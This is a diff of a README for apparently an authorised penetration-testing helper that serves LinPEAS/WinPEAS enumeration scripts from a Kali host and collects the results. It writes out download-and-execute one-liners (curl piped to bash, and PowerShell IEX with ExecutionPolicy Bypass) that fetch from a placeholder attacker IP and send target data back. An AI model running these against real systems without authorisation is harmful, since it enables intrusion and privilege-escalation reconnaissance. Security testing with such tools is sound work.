@@ -40,7 +40,7 @@ curl -sSL http://YOUR_KALI_IP:8000/get-script | bash
 
 **Windows (PowerShell):**
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_KALI_IP:8000/wrapper-inline.ps1')"
+powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_KALI_IP:8000/get-script.ps1')"
 ```
 
 ### View Reports
@@ -55,7 +55,7 @@ Navigate to `http://YOUR_KALI_IP:8000` in your browser.
 Target → Downloads script from Kali → Runs PEAS (LinPEAS/WinPEAS) → POSTs output → Kali parses → HTML report
 ```
 
-The target never needs internet - everything is served from your Kali host. The server automatically detects the target OS and serves the appropriate PEAS script.
+The target never needs internet - everything is served from your Kali host. Pick the one-liner that matches the target OS (Linux → `/get-script`, Windows → `/get-script.ps1`); each serves the appropriate PEAS binary.
 
 ---
 
